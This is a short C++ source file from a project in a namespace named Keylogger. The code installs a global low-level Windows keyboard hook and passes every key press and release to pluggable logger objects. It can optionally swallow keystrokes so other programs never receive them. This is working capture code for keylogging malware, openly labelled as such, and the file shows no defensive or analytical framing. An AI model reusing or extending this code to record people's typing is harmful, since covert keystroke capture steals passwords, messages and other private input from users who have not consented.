#include "KeystrokeCapturerWindows.h"

namespace Keylogger {

std::vector<ILogger*> KeystrokeCapturerWindows::_loggers;
bool KeystrokeCapturerWindows::_consumeKeystrokes = false;

bool KeystrokeCapturerWindows::start() {
    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    return true;
}

void KeystrokeCapturerWindows::stop() {
    UnhookWindowsHookEx(_keyboardHook);
}

void KeystrokeCapturerWindows::consumeKeystrokes(bool consume) {
    _consumeKeystrokes = consume;
}

void KeystrokeCapturerWindows::addLogger(ILogger* logger) {
    _loggers.push_back(logger);
}

LRESULT CALLBACK KeystrokeCapturerWindows::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        switch (wParam) {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
        case WM_SYSKEYUP:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int state = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN;

            for (ILogger* logger : _loggers) {
                logger->logKeycode(p->vkCode, state);
            }

            // keybd_event('B', 0, 0, 0);
            // keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
            break;
        }
    }

    return _consumeKeystrokes ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam);
}

}
